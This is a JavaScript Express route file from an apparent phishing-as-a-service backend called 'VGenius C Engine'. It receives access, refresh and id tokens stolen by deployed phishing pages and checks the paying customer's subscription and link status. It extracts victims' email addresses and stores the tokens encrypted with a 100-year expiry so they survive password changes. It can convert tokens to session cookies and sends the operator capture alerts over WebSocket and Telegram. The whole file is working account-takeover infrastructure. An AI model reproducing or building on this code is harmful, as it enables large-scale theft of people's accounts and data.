/**
 * VGenius C Engine – Token Capture Routes
 * Receives tokens from deployed phishing workers
 */

const express = require('express');
const router = express.Router();
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt } = require('../utils/encrypt');
const { processCookieConversion } = require('../services/cookieconverter');
const { sendTelegramNotification } = require('../services/notification');

// POST /api/capture – receives tokens from the phishing worker
router.post('/', async (req, res) => {
  try {
    const { jwt_token, access_token, refresh_token, id_token, ip, user_agent } = req.body;

    if (!jwt_token || !access_token) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    // Verify JWT (the one embedded in the phishing page)
    let decoded;
    try {
      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
    } catch (err) {
      return res.status(403).json({ error: 'Invalid or expired JWT' });
    }

    const { user_id, link_id } = decoded;
    if (!user_id || !link_id) {
      return res.status(403).json({ error: 'Invalid JWT payload' });
    }

    // Verify user subscription is still active
    const [users] = await db.query(
      'SELECT * FROM users WHERE id = ? AND subscription_status = ? AND (subscription_expiry IS NULL OR subscription_expiry > NOW())',
      [user_id, 'active']
    );
    if (!users.length) {
      return res.status(403).json({ error: 'Subscription inactive or expired' });
    }

    // Verify link is still active
    const [links] = await db.query(
      'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
      [link_id, user_id, 'active']
    );
    if (!links.length) {
      return res.status(403).json({ error: 'Link not active or killed' });
    }

    const link = links[0];

    // Extract email from id_token if present
    let email = null;
    if (id_token) {
      try {
        const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || null;
      } catch (e) {
        /* ignore decode errors */
      }
    }

    // Insert token record (encrypted) with 100-year expiration for persistent access
    // This ensures tokens survive password changes since we store the refresh_token
    const ttlHours = 24 * 365 * 100; // 100 years

    const [result] = await db.query(
      `INSERT INTO captured_tokens 
       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration)
       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL ? HOUR))`,
      [
        user_id,
        link_id,
        email,
        encrypt(access_token),
        encrypt(refresh_token || null),
        encrypt(id_token || null),
        ip || '0.0.0.0',
        user_agent || 'Phishing Worker',
        ttlHours
      ]
    );

    const tokenId = result.insertId;

    // If link is in cookie mode, trigger cookie conversion asynchronously
    if (link.auth_mode === 'cookie') {
      // Don't await – let it run in background
      processCookieConversion(tokenId, access_token, link.template_type)
        .then(() => {
          // Notify user via WebSocket (if available)
          const io = req.app.get('io');
          if (io) {
            io.to(`user_${user_id}`).emit('new_token', {
              id: tokenId,
              email,
              token_type: 'cookie',
              created_at: new Date()
            });
          }
          // Send Telegram notification if configured
          sendTelegramNotification(user_id, `🔐 New token captured: ${email || 'unknown'} via ${link.template_type}`);
        })
        .catch(err => console.error('[Capture] Cookie conversion failed:', err.message));
    } else {
      // Still notify
      const io = req.app.get('io');
      if (io) {
        io.to(`user_${user_id}`).emit('new_token', {
          id: tokenId,
          email,
          token_type: 'token',
          created_at: new Date()
        });
      }
      sendTelegramNotification(user_id, `🔐 New token captured: ${email || 'unknown'} via ${link.template_type}`);
    }

    res.status(200).json({ success: true, token_id: tokenId });
  } catch (err) {
    console.error('[Capture] Error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
